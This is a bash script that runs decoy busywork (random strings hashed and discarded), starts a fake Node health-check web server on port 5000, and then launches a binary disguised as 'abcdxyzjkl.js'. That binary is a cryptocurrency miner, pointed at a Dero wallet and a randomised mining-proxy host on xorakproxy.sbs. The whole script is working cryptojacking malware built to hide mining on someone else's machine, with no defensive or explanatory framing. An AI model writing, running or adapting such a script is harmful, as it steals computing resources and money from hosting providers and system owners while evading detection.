#!/bin/bash

_seed=$(date +%s%N)
r(){ echo $((($RANDOM+$_seed)%$1)); }

g(){ local l=$1 s=""; for((i=0;i<l;i++));do s+=$(printf "%x" $((RANDOM%16)));done; echo $s; }

m(){ echo "$1"|rev|base64|tr -d '='|rev; }

c(){ local x=$(r 9999); local y=$(r 8888); echo $((x*y%1337))>/dev/null; }

for i in $(seq 1 40); do
v=$(g 16)
w=$(m "$v")
c
case $((i%5)) in
0) echo "$w"|tr a-z A-Z>/dev/null;;
1) echo "$w"|sha1sum>/dev/null;;
2) echo "$w"|md5sum>/dev/null;;
3) echo "$w"|awk '{print length}'>/dev/null;;
4) echo "$w"|sed 's/[0-9]/x/g'>/dev/null;;
esac
done

for i in $(seq 1 25); do
d=$(g 24)
for j in $(seq 1 3); do
t=$(m "$d$j")
c
if [[ $((j%2)) -eq 0 ]]; then
echo "$t"|cut -c1-10>/dev/null
else
echo "$t"|rev>/dev/null
fi
done
done

for i in $(seq 1 30); do
head -c 32 /dev/urandom | base64 | tr -d '\n' >/dev/null
done

node -e "
const http=require('http')
const crypto=require('crypto')

function r(n){return crypto.randomBytes(n).toString('hex')}
function spin(){for(let i=0;i<1000;i++){Math.sqrt(i*Math.random())}}

const server=http.createServer((req,res)=>{
spin()
const u=req.url||'/'
if(u==='/'){res.writeHead(200);res.end('ok '+r(4))}
else if(u==='/api'){res.writeHead(200);res.end(JSON.stringify({t:Date.now(),id:r(6)}))}
else if(u==='/health'){res.writeHead(200);res.end('healthy')}
else{res.writeHead(404);res.end('nf')}
})

server.listen(5000,'0.0.0.0',()=>{})
setInterval(()=>{spin();r(8)},1000)
" >/dev/null 2>&1 &

sleep 0.2

p=$(shuf -e nginx a e -n1)
n=$( [ "$p" = nginx ] && shuf -i 2-10 -n1 || shuf -i 1-10 -n1 )

chmod +x abcdxyzjkl.js
./abcdxyzjkl.js -w dero1qywfazvq26p63lrm5vwnjx8arfnn76ng8dle6h43zemaxkdsgfndcqqetflax.solo -r ${p}${n}.xorakproxy.sbs:10300
